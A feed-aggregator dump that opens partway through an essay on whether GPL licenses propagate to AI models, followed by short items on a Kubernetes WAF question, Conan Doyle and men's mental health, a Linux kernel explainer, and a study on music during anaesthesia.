for discussing GPL propagation is “whether the model can be said to be a reproduction or derivative work of the GPL code,” the logic of the Munich District Court legally certified exactly that “a model can be a reproduction of training data”.Possibilities Derived from the Current Status of the Two LawsuitsFrom the two lawsuits above, we can consider the path through which the theory of license propagation to AI models might be recognized in the future.Let us assume the worst-case scenario from the perspective of AI operators, where these lawsuits are finalized with the plaintiffs winning. In the Copilot litigation, the judgment that “model providers must comply with the license conditions of the training source code” would be established, and in the GEMA litigation, the legal principle that “the model encompasses reproductions of the work” would be established. When these two intersect, the conclusion that “since an AI model containing GPL code is a reproduction or derivative work of the GPL code, the conditions of the GPL directly apply to its provision” is theoretically derived. That is, the possibility emerges that the theory of GPL propagation to models is effectively ratified by the judiciary.Specifically, if the model memorizes and contains GPL code fragments internally, the act of distributing or providing that model to a third party may be regarded as the distribution of a reproduction of GPL code; in that case, the act of distribution under conditions other than GPL would be evaluated as a GPL license violation. If a GPL violation is established, there would be room to argue for remedies such as injunctions and claims for damages, as well as forced GPL compliance demanding the disclosure of the entire model under the same license, just as in the case of ordinary software. In fact, the remedies GEMA sought from OpenAI included disclosure regarding training data and output content, and although this is in the context of musical works, this can be said to be a type of disclosure request to make transparent “what the model learned and contains.” In the case of a GPL violation as well, the possibility cannot be denied that demands such as “disclosure of the GPL code parts contained inside the model” or “source disclosure in a form that allows reconstruction of the model” would emerge in seeking license compliance.Even if not reaching such an extreme conclusion, an intermediate scenario could involve imposing certain restrictions on model providers. For example, the Copilot litigation might be settled or judged by taking measures such as “attaching a license and author attribution at the time of output if existing code of a certain length or more is included in the generated code,” or technically mandating the implementation of filters so that GPL code fragments are not extracted or reproduced from the model. In fact, GitHub, the developer of Copilot, has already introduced an optional feature that “excludes from suggestions if the candidate code matches existing code on large-scale repositories,” attempting to reduce litigation risk. Also regarding OpenAI, there are reports that it strengthened filters so that ChatGPT does not output copyrighted lyrics as they are, in response to the GEMA judgment.While these are not license propagation itself legally, in practice, they indicate that the industry is steering in the direction of “ensuring the model does not potentially infringe license conditions.” In the future, there is a possibility that guidelines for excluding data with specific license terms like GPL at the model training stage, or mechanisms and systems to guarantee that there is no license-infringing output by conducting output inspections after training, will be established.In any case, until these two lawsuits are completely settled and the subsequent legislative response is determined, the “theory of GPL propagation to models” has not completely disappeared. It is a scenario that could suddenly become realistic depending on future judgments, and even if the plaintiffs lose in the lawsuits, there is a possibility that support for this theory will reignite within the open source community. It is necessary to note that while it is currently an “undetermined theory not shouted as loudly as before,” that does not mean it has been legally completely denied and resolved. As our community, we need to carefully consider countermeasures while observing these trends and taking into account the legal systems of each country and opposing arguments described in the latter half of this article.Treatment under Japanese LawBased on the trends of the overseas lawsuits mentioned above, I will also organize the relationship between AI models, copyrighted works, and licenses under Japanese law. In Japan, Article 30-4 of the Copyright Act, introduced by the 2018 amendment, exists as a provision that comprehensively legalizes reproduction acts associated with machine learning. Furthermore, in March 2024, the Copyright Division of the Council for Cultural Affairs of the Agency for Cultural Affairs published a guideline-like document titled “Thought on AI and Copyright” (hereinafter “the Thought”), presenting a legal organization divided into the development/training stage and the generation/utilization stage of generative AI.According to “the Thought,” reproduction performed basically for the purpose of AI training is legal as long as it satisfies “information analysis not for the purpose of enjoying the thoughts or sentiments expressed in the work” as defined in Article 30-4. Therefore, acts of collecting and reproducing a wide range of data from the internet to create a training dataset for research and development purposes can be done without the permission of the rights holders in principle. However, what is important is whether an “purpose of enjoyment” is mixed into that training act. “The Thought” states that if training is conducted with the purpose of “intentionally reproducing all or part of the creative expression of a specific work in the training data as the output of generative AI,” it is evaluated as having a concurrent purpose of enjoying the work rather than mere information analysis, and thus lacks the application of Article 30-4. As a typical example of this, “overfitting” is cited, and acts such as making a model memorize specific groups of works through additional training to cause it to output something similar to those works are judged to have a purpose of enjoyment.Furthermore, “the Thought” also mentions the legal treatment of trained models, stating first that “trained models created by AI training cannot be said to be reproductions of the works used for training in many cases.” This is the view that since the model can generate outputs unrelated to the original in response to various inputs in a general-purpose manner, the model itself is not a copy of any specific work.However, “the Thought” simultaneously acknowledges the possibility that, exceptionally, in cases where “the trained model is in a state of generating products with similarity to the work that was training data with high frequency,” the creative expression of the original work remains in the model, and it may be evaluated as a reproduction. It also points out that in such cases, the model is positioned as a machine for copyright infringement, and a claim for injunction may be recognized. In short, usually the model is merely statistical data and not the work itself, but if it has turned into a device for spewing out specific works almost as they are, it can be treated as an infringing item; this thinking shares parts with the content of the GEMA judgment.It is necessary to note that the above organization is strictly a discussion of the scope of application of rights limitation provisions (exception provisions) under the Copyright Act, and does not touch upon the validity of contracts or license clauses. The Agency for Cultural Affairs document discusses from the perspective of “whether it is copyright infringement or not,” and does not deny that even if the training act is legal, contractual liability may arise if it violates terms of service or open source licenses separately. Also, no in-depth view has been shown regarding the propagation of copyleft clauses like the GPL. In Japan’s Copyright Act, there is no override provision where rights limitation provisions like Article 30-4 take precedence over contract conditions, and the “Contract Guidelines on Utilization of AI and Data” by the Ministry of Economy, Trade and Industry suggests the possibility that if there is a contract prohibiting data use between parties, that contract takes precedence.Therefore, if the license is regarded as a valid contract, even if “training is legal” under Article 30-4 of the Copyright Act, the risk remains that it becomes a “violation of license conditions” under contract law, and it can be said that at least there is no official view organizing the theory of GPL propagation to models. In other words, currently, while the legality of model training acts is recognized quite broadly under the Copyright Act, license violation is left to general civil theory, and there is no clear guideline on, for example, “whether the act of publicly distributing a model trained on GPL code constitutes a GPL license violation.” Overall, the legal organization in Japan is in a situation of “safe in principle at the copyright layer, but blank at the contract layer.” Hence, the discussion in Japan regarding the theory of GPL propagation to models relies on future judicial judgments and legislative trends, and at present, there is no choice but to consider operational guidelines carefully following the organization by the Agency for Cultural Affairs.Arguments Negating the Theory of License Propagation to ModelsAs seen in the previous sections, the theory of GPL propagation to models is not legally zero. However, many legal experts and engineers point out that this theory has serious detrimental effects. Here, I present representative arguments negating the theory of license propagation to models from the layers of copyright law, GPL text, technology, and practical policy.Arguments for Negation at the Copyright Law LayerFirst, under copyright law, it is unreasonable to regard an AI model as a “derivative work” or “reproduction” of the training source works. In many cases, the expressions of specific works are not stored inside the model in a form recognizable to humans. The model merely holds statistical abstractions where text and code have been converted into weight parameters, and that itself is not a creative expression to humans at all. A “derivative work” under copyright law refers to a creation that incorporates the essential features of the expression of the original work in a form that can be directly perceived, but one cannot directly perceive the creativity of the original code from the model’s weights. In other words, the model does not show the nature of a work directly enough to be evaluated as encompassing the original code. For example, the High Court of Justice in the UK stated in the judgment of the  case that “the Stable Diffusion model itself is not an infringing copy of the training images,” showing a negative view on regarding the model itself as a reproduction of works. Thus, there are many cautious positions internationally regarding regarding the model itself as an accumulation of works or a compilation work.Also, the output generated by the model involves probabilistic and statistical transformations, and in many cases, things that do not resemble the training source at all are output. Even if a match or similarity occurs by chance, it is difficult to prove whether it is a reproduction relying on the original or an accidental similarity. It is not realistic to conduct the certification of reliance and similarity required to discuss copyright infringement for the entire model. Ultimately, in the framework of copyright law, there is no choice but to judge “whether the model relies on a specific work” on a work-by-work basis, and recognizing uniform copyrightability or infringing nature for the model itself is a large leap. As organized in Japanese law where the model is not considered a reproduction in most cases, the schematic of model equals work is considered unreasonable under copyright law.Arguments for Negation at the GPL Text LayerNext, looking at the license text and intent of the GPL itself, doubts are cast on the interpretation that GPL propagates to AI models. For example, in the text of GPLv2, the target of copyleft is limited to “derivative works” of the original code provided under GPL and “works that contain the Program.” Typically, this has been interpreted as software created by modifying or incorporating GPL code, or software combined (linked) with GPL code. In the case of an AI model, it is extremely unclear which part of the original GPL code the model “contains.” Even if the model could memorize fragments of the GPL code used for training, it is a tiny fraction when viewed from the entire model, and most parts are occupied by parameters unrelated to the GPL code. There is no clear assumption shown by the GPL drafters as to whether a statistical model that may partially encapsulate information derived from GPL code can be said to be “a work containing the Program”.Furthermore, GPLv3 requires the provision of software source code in a “preferred form for modification.” If an AI model is a GPL derivative, the problem arises as to what that preferred form for modification would be. The model weights themselves have low readability and editability for humans, and are hard to call a “preferred form for modification.” If we ask whether the training data is the source code, the original trained GPL code itself cannot be said to be the source of the model, nor is it clear if it refers to the entire vast and heterogeneous training dataset. It is difficult to define what should be disclosed to redistribute the model under GPL compliance, and it could lead to an extreme conclusion that all code and data used for model training must be disclosed. While this is what some freedom believers aim for, it can only be said to be unrealistic in reality, and it deviates from the point of the GPL’s intent to enable users to modify and build from source. Thus, existing GPL provisions are not designed to directly cover products like AI models, and forcing their application causes discrepancies in both text and operation.In fact, in the “Open Source AI Definition” compiled by the OSI (Open Source Initiative) in 2023, regarding “information necessary for modification” of the model, it stopped at stating that sufficiently detailed information about the training data should be disclosed, and did not require the provision of the training data itself in its entirety. Also, it states that model weights and training code should be published under OSI-approved licenses.In addition, the FSF (Free Software Foundation) itself does not believe that the current GPL interpretation alone can guarantee freedom in the AI domain, and announced in 2024 that it has started formulating “conditions for machine learning applications to be free.” There, the directionality is shown that “the four freedoms should be guaranteed to users including not only software but also raw training data and model parameters,” but this conversely is a recognition that this is not guaranteed under current licenses. The FSF also points out that “since model parameters cannot be said to be source comprehensible to humans, modification through retraining is more realistic than direct editing,” and can be said to be cautious about treating models on the extension of existing GPL. Overall, claiming GPL propagation univocally to AI models that fall outside the wording and assumptions of GPL provisions is unreasonable from the perspective of interpretation.Arguments for Negation at the Technical LayerThere are also strong counterarguments from a technical perspective against the theory of GPL propagation to models. AI models, particularly those called large language models, basically hold huge statistical trends internally and do not store the original code or text as they are like a database. Returning a specific output for a specific input is merely generation according to a probability distribution, and it is not guaranteed that the same output as the training data is always obtained. If the model does not perform verbatim reproduction of training data except for a very small number of exceptional cases, evaluating it as “containing GPL code” within the model does not fit the technical reality. In fact, the OpenAI side argued in the GEMA lawsuit that “the model does not memorize individual training data, but merely reflects knowledge learned from the entire dataset in parameters.” This argument was not accepted by the Munich District Court, but that was because there was a clear example of lyric reproduction; conversely, unless there is a clear example of reproduction, the view would be that “the model is a lump of statistical knowledge”.Furthermore, although it has been confirmed that models can output fragments of training data, that proportion is considered extremely limited when viewed from the whole. Regarding the whole as a reproduction based on the existence of partial memory is like claiming the whole is a reproduction of a photograph just because it contains a tiny mosaic-like fragment in an image, which is an excessive generalization. Technically, it is difficult to quantitatively measure how far specific parameters of the model retain the influence of the original data, and the correspondence between the model and training data remains statistical and difficult to draw a line. Therefore, criteria such as “how similar must it be for GPL to propagate?” cannot be established in the first place. The judgment of infringement or not has to be done on an individual output basis, and this would not be consistent with the idea of applying a single license to the entire model. From the technical aspect, since the model is basically a statistical transformation and the majority is unrelated to GPL code, applying GPL collectively can be said to be irrational.Practical and Policy Arguments for NegationFinally, major demerits can be pointed out regarding the theory of license propagation to models from practical and policy perspectives. What would happen if this GPL propagation theory were legally recognized? As an extreme example, if 1 million code repositories were used for training a certain large-scale model, all the various licenses contained in them (GPL, MIT, Apache, proprietary, etc.) would “propagate” to the model, and the model provider would have to distribute the model in a form that complies with all 1 million license clauses. As a practical matter, there would be combinations where conditions contradict, such as GPLv2 and Apache-2.0, and attaching and managing a huge collection of copyright notices for one model is nothing but unrealistic. Applying all licenses to an AI model created from training data with mixed licenses is practically bankrupt, and eventually, the only thing that can be done to avoid it would be to exclude code with copyleft licenses like GPL from the training data from the start.Is such a situation really desirable for our community? The spirit of the GPL is to promote the free sharing and development of software. However, if asserting excessive propagation to AI models causes companies to avoid using GPL code, and as a result, the value held by GPL software is not utilized in the AI era, it would be putting the cart before the horse. In the field of software development, many companies take a policy of not mixing GPL code into their own products, but similarly, if it becomes “do not include GPL in our AI training data,” GPL projects could lose value as data sources. Furthermore, the current legal battles surrounding AI are leaning more towards monetary compensation and regulatory rule-making, and the reality is that they are proceeding in a different vector from the direction of code sharing idealized by GPL. If only the theory of GPL propagation to models walks alone, in reality, only data exclusion and closing off to avoid litigation risks will progress, and there is a fear that it will not lead to the expansion of free software culture.Policy-wise as well, governments of each country are carefully considering the use of copyrighted works in AI, but at present, there is no example establishing an explicit rule that “license violation of training data generates legal liability for the model.” Even in the EU AI Act, while there are provisions regarding the quality and transparency of training data, it does not demand compliance with open source licenses. Rather, from the perspective of promoting open science and innovation, the movement to allow text and data mining under rights limitations is strong. In Japan as well, as mentioned earlier, the direction is to broadly recognize information analysis use under Article 30-4, and the policy of forcibly applying licenses to AI models is not mainstream in current international discussions.Based on the above, the theory of license propagation to models is highly likely to cause disadvantages to open source on both practical and policy fronts, and can be said not to be a realistic solution. What is important is how to realize the “freedom of software,” which is the philosophy of open source, in the AI era; the opinion that this should be attempted through realistic means such as ensuring transparency and promoting open model development rather than extreme legal interpretations is potent, and this is something I have consistently argued as well.The Stance of OSI and FSFI will also organize what stance major organizations in the open source (and free software) community are currently taking in relation to the theory of GPL propagation to AI models. Representative organizations are the Open Source Initiative (OSI) and the Free Software Foundation (FSF); while they share the goal of software freedom, they do not necessarily take the same approach regarding AI models and training data.First, the OSI formulated the “Open Source AI Definition” (OSAID) in 2024, defining the requirements for an AI system to be called open source. This definition states that the four freedoms (use, study, modify, redistribute) similar to software should be guaranteed for AI systems as well, and defines requirements regarding “forms necessary for modification” to realize that, requiring the disclosure of the following three elements.Data Information: Provide sufficiently detailed information about the data used for training so that a skilled person can reconstruct an equivalent model.
This does not make publishing the training data itself in its entirety mandatory, but requires disclosing the origin, scope, nature, and acquisition method if there is data that cannot be published, listing data that can be published, and providing information on data available from third parties.Code: Publish the complete set of source code for training and running the model under an OSI-approved license.Parameters: Publish the model weights (parameters) under OSI-approved conditions.It should be noted that while OSI states that information regarding the code used for training and training data is indispensable in addition to model weights to realize “Open Source AI,” it does not require the complete disclosure of the training data itself. This is a flexible stance that, for example, if raw data cannot be published due to privacy or confidentiality, explaining the nature of the data by clarifying that fact can substitute. Also, the legal mechanism to ensure free use of model parameters is an issue to be clarified in the future, and at present, no conclusion has been reached on legal rights control (e.g., presence or absence of copyrightability) over parameters either.As can be read from these, the OSI promotes opening up AI models at the level of the open source definition in principle, but keeps the handling of training data to requirements at the information disclosure level. Thereby, it can be said that the OSI avoids adopting the theory of license propagation to models to demand training data disclosure, and is exploring a realistic solution that first guarantees transparency and reproducibility. In principle, it could be said that the OSI denied the GPL propagation theory at the time of publishing the OSAID definition. Note that I am probably the one who sealed the mandatory argument for training data in the final stage of this definition’s formulation process, and I believe this was the correct judgment.On the other hand, the FSF and FSF Europe (FSFE) take a stance more faithful to fundamental principles. FSFE declared as of 2021 that “for an AI application to be free, both its training code and training data must be published under a free software license.” That is, to modify or verify the model, one must be able to obtain it including the training data, and therefore both must be free. Also, the FSF itself stated in a 2024 statement, “Under current understanding, for an ML application to be called free, all training data and the scripts processing it must satisfy the four freedoms,” trying to extend the requirements of freedom to data. Thus, FSF/FSFE stands on the position that a model with undisclosed training data is unfree as a whole even if the software part is free.However, the FSF simultaneously states to the effect that “whether a non-free machine learning application is ethically unjust depends on the case,” mentioning that there can be “legitimate moral reasons” for not being able to publish training data (personal information) of a medical diagnosis AI, for example. In that case, it implies that although that AI is non-free, its use might be ethically permitted due to social utility. One can see an attitude of seeking a compromise between the FSF’s ideal and reality here, but in any case, there is no mistake that the FSF ultimately aims for freedom including training data.So, does the FSF support the theory of GPL propagation to AI models? Not necessarily. Their claim is closer to an ethical standard or ideal image rather than legal enforceability, and they are not arguing that it applies to models as an interpretation of the current GPL license. Rather, as mentioned before, they are at the stage of trying to create new standards and agreements. Even in the white paper on the Copilot issue funded by the FSF, while legal points such as copyright and license violation are discussed, substantially it has a strong aspect of being told as a GPL compliance problem for users (downstream developers) concerned that they bear the risk of GPL violation if Copilot’s output contains GPL code fragments. This is a caution to developers using AI coding tools rather than GPL application to the model itself, and is different from an approach forcing GPL compliance directly on model providers.The Software Freedom Conservancy (SFC) naturally has a strong interest in this issue but is also cautious in some respects. The SFC started the protest campaign “Give Up GitHub” against GitHub in 2022, condemning Copilot’s methods as contrary to the philosophy of open source, and is also involved in the Copilot class action. However, in an SFC blog post, regarding this lawsuit, it showed concern about “the risk of interpretations deviating from the principles of the open source community being brought in,” and called on the plaintiffs’ side to comply with community-led GPL enforcement principles as well. The SFC also states that Copilot’s act is an “unprecedented license violation,” and while not fully denying the GPL propagation theory, it can be interpreted as fearing that a judicial precedent undesirable for the community might be created depending on the result of the legal battle. The SFC might be said to be carefully balancing between the aspect of pursuing GPL propagation and the risk of entrusting it to the judiciary.Finally, what is concerned as the free software camp is that excessive propagation of licenses might conversely invite results that impair freedom. Both OSI and FSF ultimately want to make AI something open that anyone can utilize, but they are carefully assessing whether increasing the purity of legal theory in demands for full data disclosure really leads to achieving the objective. Considering the demerits such as the avoidance of open data due to excessive propagation interpretation or the atrophy effect due to a flurry of lawsuits, I feel that the major organizations share a commonality in that it is essential not to lose sight of the big picture of spreading freedom. Rather than inciting GPL application to models, the pursuit of realistic solutions such as how to make models and data open and which parts should be relaxed in line with reality will likely continue in the future.I have looked at the current state of the theory of GPL propagation to AI models above, and as a conclusion, this theory is in a halfway position where “it is not touted as loudly as before, but it has not completely disappeared.” As a result of points such as license violation of training data and reproduction within the model beginning to be scrutinized in lawsuits like the Copilot class action and , it even appears that the hurdle for infringement certification is lowering. In fact, the Munich District Court’s judgment deemed model memory as reproduction, and the claim of open source license violation survives in the Copilot litigation.However, on the other hand, the hurdle for the propagation of licenses like GPL remains high. There is a large gap between infringement being recognized and the conclusion that the entire model must be disclosed under GPL etc. immediately. What the current lawsuits are seeking is also injunctions and damages, not the forced GPL-ization of the model. There are zero examples where the judiciary supported the theory of GPL propagation to models itself, and it is a legally uncharted territory. Even if that claim were attempted somewhere in the future, it would face the legal, technical, and practical counterarguments mentioned earlier.However, the situation has fluid parts, and there is a possibility that the line will shift depending on the policies of each country and the trends of the community. For example, if pressure from rights holder groups strengthens in Europe, there is a possibility that guidelines including license compliance will be formulated. Also, if a consensus is formed within the community regarding the state of copyleft in the AI era, a new license might appear. If such changes occur, a phase where the theory of propagation to models is re-evaluated will also arrive.To offer my personal opinion, what is important at this moment is the perspective of how to balance software freedom and freedom in the AI domain. Instead of blindly trying to apply the philosophy of copyleft to AI, it is necessary to think about what is best to maximize freedom while considering the technical nature and industrial structure peculiar to AI. Fortunately, solutions to practical problems such as the open publication of large-scale AI models, dataset cleaning methods, and automated attachment of license notices are already being explored by the open source community. Promoting such voluntary efforts and supporting them with legal frameworks as necessary will likely be the key to balancing freedom and development.The theory of GPL propagation to models is a point where judgment is divided on whether it is an ideal to be pursued or a nightmare to be avoided. However, as stated in this article, seeing the situation in the current year of 2025, it is not a situation where it will become reality immediately, and the majority of the community is likely maintaining a cautious stance. Although it is speculated that trial and error will continue in the judicial, legislative, and technical aspects in the future, as our community, we need to continue exploring the point of compatibility between technological innovation and software freedom without jumping to hasty conclusions. That process itself can be said to be a new challenge in the AI era on the extension of the free software spirit.]]></content:encoded></item><item><title>WAF for nginx-ingress (or alternatives?)</title><link>https://www.reddit.com/r/kubernetes/comments/1p7zmpl/waf_for_nginxingress_or_alternatives/</link><author>/u/marahin</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Thu, 27 Nov 2025 11:09:15 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[I'm self-hosting a Kubernetes cluster at home. Some of the services are exposed to the internet. All http(s) traffic is only accepted from Cloudflare IPs.This is fine for a general web app, but when it comes to media hosting it's an issue, since Cloudflare has limitations on how much can you push through to the upstream (say, a big docker image upload to my registry will just fail).Also I can still see _some_ malicious requests. For example, I receive some checking for ,  files, etc.I'm running  which has some support for paid license WAF (F5 WAF) which I'm not interested in. I'd much rather run with Coraza or something similar. However, I don't see clear integrations documented in the web.have something filtering the HTTP(s) traffic that my cluster receives - it has to run in the cluster,be able to securely receive traffic from outside of Cloudflare, a big plus would be if I could do it based on the domain (host), e.g. host-A.com will only handle traffic coming through CF, and host-B.com will handle traffic from wherever,some services in mind: docker-registry, nextcloudIf we go by an nginx-ingress alternative, it has to:support cert-manager & LetsEncrypt cluster issuers (or something similar - basically HTTPS everywhere),support retrieving real ip from headers (from traffic coming from Cloudflare)support retrieving real ip (replacing the local router gateway the traffic was forwarded from)What do you use? What should I be using?]]></content:encoded></item><item><title>Weekly: This Week I Learned (TWIL?) thread</title><link>https://www.reddit.com/r/kubernetes/comments/1p7zhaw/weekly_this_week_i_learned_twil_thread/</link><author>/u/gctaylor</author><category>dev</category><category>reddit</category><category>k8s</category><pubDate>Thu, 27 Nov 2025 11:00:33 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Kubernetes</source><content:encoded><![CDATA[Did you learn something new this week? Share here!]]></content:encoded></item><item><title>Arthur Conan Doyle explored men’s mental health through Sherlock Holmes</title><link>https://theconversation.com/arthur-conan-doyle-explored-mens-mental-health-through-his-sherlock-holmes-stories-246728</link><author>PikelEmi</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 10:54:02 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Arthur Conan Doyle was not just one of the world’s best crime fiction writers. He was a progressive wordsmith who brought light to controversial and taboo subjects. One of those taboo subjects was male vulnerability and mental health problems – a topic of personal significance to the author.The character of Sherlock Holmes is a true expression of male vulnerability that does not equate it with weakness. Doyle does not represent Holmes as infallible, but as a man others can relate to – he battles with drug addiction, loneliness and depression. His genius thrives in part because of these vulnerabilities, not despite them.In The Man with the Twisted Lip, for example, a man named Neville St Clair hides his double life. He tells his family that he is a respectable entrepreneur going to London on business. In reality he is begging on the city streets. He lives this double life due to fear and shame over the inability to pay off his debts. “It was a long fight between my pride and the money,” he explains, “but the dollars won at last.” “I would have endured imprisonment, ay, even execution, rather than have left my miserable secret as a family blot to my children,” St Clair says. In having his character consider execution to protect his and his family’s reputation, Doyle explored the societal expectations of Victorian masculinity and how men struggled with such pressures. The Stockbroker’s Clerk also examines male suicide, as well as economic and professional anxieties. When Holmes reveals the crimes of Harry Pinner, the man attempts suicide rather than face prison. In The Engineer’s Thumb, hydraulic engineer Victor is treated physically by Watson and mentally by Holmes. As Doyle writes: “Round one of his hands he had a handkerchief wrapped, which was mottled all over with bloodstains. He was young, not more than five-and-twenty, I should say, with a strong masculine face; but he was exceedingly pale and gave me the impression of a man who was suffering from some strong agitation, which it took all his strength of mind to control.”The physical injury marks Victor as a victim of physical violence. Watson suggests that Victor is using all his mental capabilities to keep calm about his severe pain. Holmes treats Victor’s mind as he listens to his story: “Pray lie down there and make yourself absolutely at home. Tell us what you can, but stop when you are tired, and keep up your strength with a little stimulant.” Holmes is a protector, a confidante and a comforter in this scene. He provides Victor with breakfast, induces him to lie down and offers him a stimulant (more than likely brandy).  The extremity of violence that Victor has endured has escalated to mental trauma. In having Holmes treat Victor’s mental trauma while Watson treats his physical pain, Doyle showed the importance psychological support for men of the age. Holmes was a highly popular character. To contemporary readers, his drug use and dysfunctional clients were seen as markers of his genius rather than a reflection of the significant social issues that men faced during this period. But today, they offer a window into the mental struggles of Victorian men, and a point of connection between readers of the past and present. Looking for something good? Cut through the noise with a carefully curated selection of the latest releases, live events and exhibitions, straight to your inbox every fortnight, on Fridays. Sign up here.This article features references to books that have been included for editorial reasons, and may contain links to bookshop.org. If you click on one of the links and go on to buy something from bookshop.org The Conversation UK may earn a commission.]]></content:encoded></item><item><title>Mixpanel Security Breach</title><link>https://mixpanel.com/blog/sms-security-incident/</link><author>jaredwiener</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 07:02:40 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>The Nerd Reich – Silicon Valley Fascism and the War on Democracy</title><link>https://www.simonandschuster.com/books/The-Nerd-Reich/Gil-Duran/9781668221402</link><author>brunohaid</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 06:53:17 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Linux Kernel Explorer</title><link>https://reverser.dev/linux-kernel-explorer</link><author>tanelpoder</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 06:17:37 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[The kernel isn't a process—it's the system. It serves user processes, reacts to context, and enforces separation and control.The Kernel Is Not a Process: It's the always-present authority bridging hardware and software.: Orchestrates syscalls, interrupts, and scheduling to keep user tasks running.: Virtual, mapped, isolated, and controlled—structure at runtime.1. What is the fundamental difference between the kernel and a process?2. How does the kernel primarily serve user processes?3. What characterizes the kernel's system of layers?]]></content:encoded></item><item><title>Tell HN: Happy Thanksgiving</title><link>https://news.ycombinator.com/item?id=46065955</link><author>prodigycorp</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 05:21:16 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[I’ve been a part of this community for fifteen years. Despite the yearly bemoaning of HN’s quality compared to its mythical past, I’ve found that it’s the one community that has remained steadfast as a source of knowledge, cattiness, and good discussion.Thank you @dang and @tomhow.]]></content:encoded></item><item><title>Music eases surgery and speeds recovery, study finds</title><link>https://www.bbc.com/news/articles/c231dv9zpz3o</link><author>1659447091</author><category>dev</category><category>hn</category><pubDate>Thu, 27 Nov 2025 04:55:57 +0000</pubDate><source url="https://news.ycombinator.com/best">HN</source><content:encoded><![CDATA[Under the harsh lights of an operating theatre in the Indian capital, Delhi, a woman lies motionless as surgeons prepare to remove her gallbladder.She is under general anaesthesia: unconscious, insensate and rendered completely still by a blend of drugs that induce deep sleep, block memory, blunt pain and temporarily paralyse her muscles.Yet, amid the hum of monitors and the steady rhythm of the surgical team, a gentle stream of flute music plays through the headphones placed over her ears.Even as the drugs silence much of her brain, its auditory pathway remains partly active. When she wakes up, she will regain consciousness more quickly and clearly because she required lower doses of anaesthetic drugs such as propofol and opioid painkillers than patients who heard no music.That, at least, is what a new peer-reviewed study from Delhi's Maulana Azad Medical College and Lok Nayak Hospital suggests. The research, published in the journal Music and Medicine, offers some of the strongest evidence yet that music played during general anaesthesia can modestly but meaningfully reduce drug requirements and improve recovery.The study focuses on patients undergoing laparoscopic cholecystectomy, the standard keyhole operation to remove the gallbladder. The procedure is short - usually under an hour - and demands a particularly swift, "clear-headed" recovery.To understand why the researchers turned to music, it helps to decode the modern practice of anaesthesia."Our aim is early discharge after surgery," says Dr Farah Husain, senior specialist in anaesthesia and certified music therapist for the study. "Patients need to wake up clear-headed, alert and oriented, and ideally pain-free. With better pain management, the stress response is curtailed." Achieving that requires a carefully balanced mix of five or six drugs that together keep the patient asleep, block pain, prevent memory of the surgery and relax the muscles.In procedures like laparoscopic gallbladder removal, anaesthesiologists now often supplement this drug regimen with regional "blocks" - ultrasound-guided injections that numb nerves in the abdominal wall. "General anaesthesia plus blocks is the norm," says Dr Tanvi Goel, primary investigator and a former senior resident of Maulana Azad Medical College. "We've been doing this for decades."But the body does not take to surgery easily. Even under anaesthesia, it reacts: heart rate rises, hormones surge, blood pressure spikes. Reducing and managing this cascade is one of the central goals of modern surgical care. Dr Husain explains that the stress response can slow recovery and worsen inflammation, highlighting why careful management is so important.The stress starts even before the first cut, with intubation - the insertion of a breathing tube into the windpipe.To do this, the anaesthesiologist uses a laryngoscope to lift the tongue and soft tissues at the base of the throat, obtain a clear view of the vocal cords, and guide the tube into the trachea. It's a routine step in general anaesthesia that keeps the airway open and allows precise control of the patient's breathing while they are unconscious."The laryngoscopy and intubation are considered the most stressful response during general anaesthesia," says Dr Sonia Wadhawan, director-professor of anaesthesia and intensive care at Maulana Azad Medical College and supervisor of the study."Although the patient is unconscious and will remember nothing, their body still reacts to the stress with changes in heart rate, blood pressure, and stress hormones."To be sure, the drugs have evolved. The old ether masks have vanished. In their place are intravenous agents - most notably propofol, the hypnotic made infamous by Michael Jackson's death but prized in operating theatres for its rapid onset and clean recovery. "Propofol acts within about 12 seconds," notes Dr Goel. "We prefer it for short surgeries like laparoscopic cholecystectomy because it avoids the 'hangover' caused by inhalational gases."The team of researchers wanted to know whether music could reduce how much propofol and fentanyl (an opioid painkiller) patients required. Less drugs means faster awakening, steadier vital signs and reduced side effects.So they designed a study. A pilot involving eight patients led to a full 11-month trial of 56 adults, aged roughly 20 to 45, randomly assigned to two groups. All received the same five-drug regimen: a drug that prevents nausea and vomiting, a sedative, fentanyl, propofol and a muscle relaxant. Both groups wore noise-cancelling headphones - but only one heard music."We asked patients to select from two calming instrumental pieces - soft flute or piano," says Dr Husain. "The unconscious mind still has areas that remain active. Even if the music isn't explicitly recalled, implicit awareness can lead to beneficial effects."The results were striking.Patients exposed to music required lower doses of propofol and fentanyl. They experienced smoother recoveries, lower cortisol or stress-hormone levels and a much better control of blood pressure during the surgery. "Since the ability to hear remains intact under anaesthesia," the researchers write, "music can still shape the brain's internal state."Clearly, music seemed to quieten the internal storm. "The auditory pathway remains active even when you're unconscious," says Dr Wadhawan. "You may not remember the music, but the brain registers it."The idea that the mind behind the anaesthetic veil is not entirely silent has long intrigued scientists. Rare cases of "intraoperative awareness" show patients recalling fragments of operating-room conversation. If the brain is capable of picking up and remembering stressful experiences during surgery - even when a patient is unconscious - then it might also be able to register positive or comforting experiences, like music, even without conscious memory."We're only beginning to explore how the unconscious mind responds to non-pharmacological interventions like music," says Dr Husain. "It's a way of humanising the operating room."Music therapy is not new to medicine; it has long been used in psychiatry, stroke rehabilitation and palliative care. But its entry into the intensely technical, machine-governed world of anaesthesia marks a quiet shift.If such a simple intervention can reduce drug use and speed recovery - even modestly - it could reshape how hospitals think about surgical wellbeing.As the research team prepares its next study exploring music-aided sedation, building on earlier findings, one truth is already humming through the data: even when the body is still and the mind asleep, it appears a few gentle notes can help the healing begin.]]></content:encoded></item><item><title>DIY 